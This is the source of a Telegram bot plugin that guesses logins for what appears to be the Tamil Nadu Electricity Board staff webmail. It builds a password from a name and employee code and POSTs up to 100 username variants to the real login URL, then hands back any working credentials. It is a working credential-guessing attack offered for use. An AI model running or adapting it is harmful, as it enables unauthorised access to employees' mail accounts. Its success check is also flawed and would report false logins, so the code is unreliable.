from pyrogram import Client, filters
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
import re
import asyncio
import aiohttp

TNEB_USERS = {}

# 🔗 TNEB Login URL
TNEB_LOGIN_URL = "https://nmail.tnebltd.org/cgi-bin/sqwebmail?index=1"  # உங்கள் URL

@Client.on_message(filters.private & filters.command("tneb"))
async def tneb_start(client, message: Message):
    TNEB_USERS[message.from_user.id] = {"step": "name"}
    await message.reply("Enter name (format: `ramesh.g`):")

@Client.on_message(filters.private & filters.text)
async def tneb_flow(client, message: Message):
    uid = message.from_user.id
    
    if uid not in TNEB_USERS:
        return
    if message.text.startswith("/"):
        return
    
    data = TNEB_USERS[uid]
    
    if data["step"] == "name":
        name = message.text.strip().lower()
        
        if not re.match(r"^[a-z]+\.[a-z]$", name):
            return await message.reply("Invalid! Use: `ramesh.g`")
        
        data["name"] = name
        data["step"] = "emp"
        return await message.reply("Enter Employee Code:")
    
    if data["step"] == "emp":
        emp = message.text.strip()
        
        if not emp.isdigit():
            return await message.reply("Numbers only!")
        
        name = data["name"]
        password = name[:2] + emp  # First 2 letters + emp code
        
        msg = await message.reply("🔍 Starting login attempts...")
        
        success = None
        total = 100  # Try up to 100 combinations
        
        for i in range(total):
            username = name if i == 0 else f"{name}{i}"
            
            # Progress dots
            dots = "●" * (i + 1) + "○" * (total - i - 1)
            percent = int(((i + 1) / total) * 100)
            
            text = f"🔍 Trying: `{username}`\n\n{dots} {percent}%"
            
            # Every 5 checks, update
            if (i + 1) % 5 == 0:
                text += f"\n\n✅ {i + 1} combinations checked..."
            
            await msg.edit_text(text)
            
            # 🔴 REAL LOGIN CHECK HERE
            if await try_tneb_login(username, password):
                success = username
                break
            
            await asyncio.sleep(0.5)  # Small delay between attempts
        
        del TNEB_USERS[uid]
        
        if success:
            await msg.edit_text(
                f"✅ **Login Successful!**\n\n"
                f"👤 Username: `{success}`\n"
                f"🔐 Password: `{password}`",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔗 Login to TNEB", url=TNEB_LOGIN_URL)]
                ])
            )
        else:
            await msg.edit_text(
                f"❌ **Login Failed**\n\n"
                f"Checked {total} combinations.\n"
                f"No valid credentials found.\n\n"
                f"Please verify your details."
            )

async def try_tneb_login(username, password):
    """
    🔴 இங்கே உங்கள் TNEB Login Logic-ஐ Add பண்ணவும்
    
    Return True if login success
    Return False if login failed
    """
    try:
        async with aiohttp.ClientSession() as session:
            data = {
                "username": username,
                "password": password,
                # Add other required fields if needed
            }
            
            async with session.post(TNEB_LOGIN_URL, data=data, timeout=10) as resp:
                # Check if login successful
                # This depends on TNEB portal response
                response_text = await resp.text()
                
                # Example checks (modify based on actual response):
                if "welcome" in response_text.lower():
                    return True
                if "dashboard" in response_text.lower():
                    return True
                if resp.url != TNEB_LOGIN_URL:  # Redirected = success
                    return True
                    
                return False
                
    except Exception as e:
        print(f"Login error: {e}")
        return False
